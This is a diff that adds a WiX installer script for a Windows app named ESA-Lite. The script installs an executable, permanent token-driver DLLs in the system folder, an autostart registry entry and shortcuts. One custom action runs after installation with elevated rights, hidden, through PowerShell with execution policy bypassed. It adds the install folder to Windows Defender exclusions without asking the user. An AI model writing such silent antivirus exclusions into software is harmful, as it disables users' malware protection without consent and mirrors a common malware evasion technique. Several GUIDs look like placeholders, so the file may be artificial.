@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi" xmlns:util="http://schemas.microsoft.com/wix/UtilExtension">
+    <!-- RepoRoot must be passed by candle: -dRepoRoot=<absolute-or-relative-repo-root> -->
+    <Product Id="*" Name="!(loc.ProductName)" Language="$(var.Language)" Codepage="1256" Version="2.1.0" Manufacturer="!(loc.Manufacturer)" UpgradeCode="e7b2f1a4-1234-4567-89ab-cdef12345678">
+        <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" Platform="x64" />
+
+        <MajorUpgrade Schedule="afterInstallInitialize" DowngradeErrorMessage="!(loc.DowngradeError)" />
+        <MediaTemplate EmbedCab="yes" />
+
+        <Property Id="WIXUI_INSTALLDIR" Value="INSTALLFOLDER" />
+
+        <WixVariable Id="WixUIBannerBmp" Value="$(var.RepoRoot)\assets\installer_banner.bmp" />
+        <WixVariable Id="WixUIDialogBmp" Value="$(var.RepoRoot)\assets\installer_dialog.bmp" />
+        <WixVariable Id="WixUILicenseRtf" Value="$(var.LicenseRtf)" />
+
+        <Icon Id="AppIcon.ico" SourceFile="$(var.RepoRoot)\assets\icon.ico"/>
+        <Property Id="ARPPRODUCTICON" Value="AppIcon.ico" />
+
+        <Property Id="WIXUI_EXITDIALOGOPTIONALCHECKBOXTEXT" Value="!(loc.LaunchAppText)" />
+        <Property Id="WIXUI_EXITDIALOGOPTIONALCHECKBOX" Value="1" />
+        <Property Id="WixShellExecTarget" Value="[#ESA_EXE]" />
+        <CustomAction Id="LaunchApplication" BinaryKey="WixCA" DllEntry="WixShellExec" Impersonate="yes" />
+
+        <UI>
+            <UIRef Id="WixUI_FeatureTree" />
+            <Publish Dialog="ExitDialog" Control="Finish" Event="DoAction" Value="LaunchApplication">WIXUI_EXITDIALOGOPTIONALCHECKBOXTEXT = 1 and NOT Installed</Publish>
+        </UI>
+
+        <Feature Id="MainProduct" Title="!(loc.FeatureMainTitle)" Description="!(loc.FeatureMainDesc)" Level="1" Display="expand" ConfigurableDirectory="INSTALLFOLDER">
+            <ComponentGroupRef Id="ProductComponents" />
+            <ComponentRef Id="SystemDrivers" />
+
+            <Feature Id="ShortcutsFeature" Title="!(loc.FeatureShortcutTitle)" Description="!(loc.FeatureShortcutDesc)" Level="1">
+                <ComponentRef Id="ApplicationShortcut" />
+            </Feature>
+
+            <Feature Id="DesktopShortcutFeature" Title="!(loc.FeatureDesktopTitle)" Description="!(loc.FeatureDesktopDesc)" Level="1">
+                <ComponentRef Id="DesktopShortcut" />
+            </Feature>
+
+            <Feature Id="AutoStartFeature" Title="!(loc.FeatureAutoStartTitle)" Description="!(loc.FeatureAutoStartDesc)" Level="1">
+                <ComponentRef Id="RegistryAutoRun" />
+            </Feature>
+        </Feature>
+
+        <CustomAction Id="AddDefenderExclusion"
+                      Directory="INSTALLFOLDER"
+                      ExeCommand="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command &quot;Add-MpPreference -ExclusionPath '[INSTALLFOLDER]'&quot;"
+                      Execute="deferred"
+                      Return="check"
+                      Impersonate="no" />
+
+        <InstallExecuteSequence>
+            <Custom Action="AddDefenderExclusion" After="InstallFiles">NOT Installed</Custom>
+        </InstallExecuteSequence>
+    </Product>
+
+    <Fragment>
+        <Directory Id="TARGETDIR" Name="SourceDir">
+            <Directory Id="ProgramFiles64Folder">
+                <Directory Id="INSTALLFOLDER" Name="ESA-Lite" />
+            </Directory>
+            <Directory Id="System64Folder" />
+            <Directory Id="DesktopFolder" Name="Desktop" />
+            <Directory Id="ProgramMenuFolder">
+                <Directory Id="ApplicationProgramsFolder" Name="ESA-Lite"/>
+            </Directory>
+        </Directory>
+    </Fragment>
+
+    <Fragment>
+        <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
+            <Component Id="MainExecutable" Guid="a1b2c3d4-5678-90ab-cdef-1234567890ab" Win64="yes">
+                <File Id="ESA_EXE" Source="$(var.RepoRoot)\dist_bin\ESA_Lite_v2.1.0.exe" Name="ESA_Lite.exe" KeyPath="yes" Checksum="yes" />
+            </Component>
+        </ComponentGroup>
+
+        <DirectoryRef Id="System64Folder">
+            <Component Id="SystemDrivers" Guid="c1d2e3f4-5678-90ab-cdef-1234567890ab" Win64="yes" Permanent="yes">
+                <File Id="Driver1" Source="$(var.RepoRoot)\assets\drivers\x64\eps2003csp11.dll" KeyPath="yes" />
+                <File Id="Driver2" Source="$(var.RepoRoot)\assets\drivers\x64\eps2003csp11_s.dll" />
+            </Component>
+        </DirectoryRef>
+
+        <DirectoryRef Id="INSTALLFOLDER">
+            <Component Id="RegistryAutoRun" Guid="d1e2f3a4-5678-90ab-cdef-1234567890ab" Win64="yes">
+                <RegistryValue Root="HKCU" Key="Software\Microsoft\Windows\CurrentVersion\Run" Name="ESA_Lite" Value="&quot;[INSTALLFOLDER]ESA_Lite.exe&quot; --tray" Type="string" KeyPath="yes" />
+            </Component>
+        </DirectoryRef>
+
+        <DirectoryRef Id="ApplicationProgramsFolder">
+            <Component Id="ApplicationShortcut" Guid="b2c3d4e5-6789-0abc-def1-234567890abc">
+                <Shortcut Id="ApplicationStartMenuShortcut"
+                          Name="!(loc.ProductName)"
+                          Description="!(loc.AppDescription)"
+                          Target="[INSTALLFOLDER]ESA_Lite.exe"
+                          WorkingDirectory="INSTALLFOLDER"/>
+                <RemoveFolder Id="CleanupShortcut" Directory="ApplicationProgramsFolder" On="uninstall"/>
+                <RegistryValue Root="HKCU" Key="Software\DTS\ESALite" Name="installed" Type="integer" Value="1" KeyPath="yes"/>
+            </Component>
+        </DirectoryRef>
+
+        <DirectoryRef Id="DesktopFolder">
+            <Component Id="DesktopShortcut" Guid="e1f2a3b4-5678-90ab-cdef-1234567890ab">
+                <Shortcut Id="ApplicationDesktopShortcut"
+                          Name="!(loc.ProductName)"
+                          Description="!(loc.AppDescription)"
+                          Target="[INSTALLFOLDER]ESA_Lite.exe"
+                          WorkingDirectory="INSTALLFOLDER"/>
+                <RegistryValue Root="HKCU" Key="Software\DTS\ESALite" Name="desktop_shortcut" Type="integer" Value="1" KeyPath="yes"/>
+            </Component>
+        </DirectoryRef>
+    </Fragment>
+</Wix>
